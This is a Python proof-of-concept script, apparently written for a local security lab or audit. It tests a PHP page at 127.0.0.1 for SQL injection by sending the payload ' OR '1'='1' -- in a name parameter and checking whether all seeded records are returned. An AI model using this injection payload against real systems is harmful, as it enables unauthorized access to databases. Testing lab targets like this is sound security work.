#!/usr/bin/env python3
import html
import re
import sys
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import Request, build_opener, HTTPRedirectHandler

BASE = "http://127.0.0.1:4280"
PATH = "/lab_cases/S001/index.php"
NORMAL_NAME = "Alice"
TEST_NAME = "' OR '1'='1' -- "
EXPECTED_NORMAL = {("1", "Alice")}
EXPECTED_TEST = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}


class BlockRedirects(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise HTTPError(newurl, code, "redirect blocked by S001 POC", headers, fp)


def fetch_rows(name):
    url = BASE + PATH + "?" + urlencode({"name": name})
    req = Request(url, headers={"User-Agent": "S001-audit-poc"})
    opener = build_opener(BlockRedirects())
    with opener.open(req, timeout=10) as resp:
        raw = resp.read()
        charset = resp.headers.get_content_charset() or "utf-8"
        body = raw.decode(charset, "replace")

    rows = set()
    pattern = re.compile(r"<p>\s*ID\s*(\d+)\s*：\s*(.*?)</p>", re.S)
    for m in pattern.finditer(body):
        id_text = m.group(1)
        name_text = html.unescape(re.sub(r"<[^>]+>", "", m.group(2))).strip()
        rows.add((id_text, name_text))
    return rows, body


def main():
    print("Target:", BASE + PATH)
    try:
        normal_rows, _ = fetch_rows(NORMAL_NAME)
        test_rows, _ = fetch_rows(TEST_NAME)
    except (HTTPError, URLError, TimeoutError, OSError) as e:
        print("REQUEST_FAILED:", repr(e))
        return 2

    print("normal rows:", sorted(normal_rows))
    print("test rows:  ", sorted(test_rows))

    ok_normal = normal_rows == EXPECTED_NORMAL
    ok_test = test_rows == EXPECTED_TEST

    if ok_normal and ok_test:
        print("POC_SUCCESS: normal=仅Alice; test=全部三条记录; 记录集合符合SQL注入条件绕过预期。")
        return 0

    print("POC_NOT_CONFIRMED")
    print("  normal_expected:", sorted(EXPECTED_NORMAL))
    print("  test_expected:  ", sorted(EXPECTED_TEST))
    print("请检查入口、db_connect.php 的 $db、lab_people 预置数据、mysqli 错误模式、额外过滤/重定向。")
    return 1


if __name__ == "__main__":
    sys.exit(main())
